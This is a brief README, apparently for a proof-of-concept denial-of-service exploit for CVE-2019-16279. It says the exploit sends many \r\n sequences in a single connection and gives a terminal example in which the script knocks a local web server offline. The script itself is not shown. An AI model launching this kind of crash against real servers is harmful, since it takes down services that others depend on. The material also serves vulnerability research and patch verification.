# CVE-2019-16279
（CVE-2019-16279）dos
This bug exploit a memory error when sending too many \r\n in a single connexion.



Example

$ curl http://127.0.0.1:8080
HELLO!
$ ./CVE-2019-16279.sh 127.0.0.1 8080
$ curl http://127.0.0.1:8080
curl: (7) Failed to connect to 127.0.0.1 port 8080: Connection refused
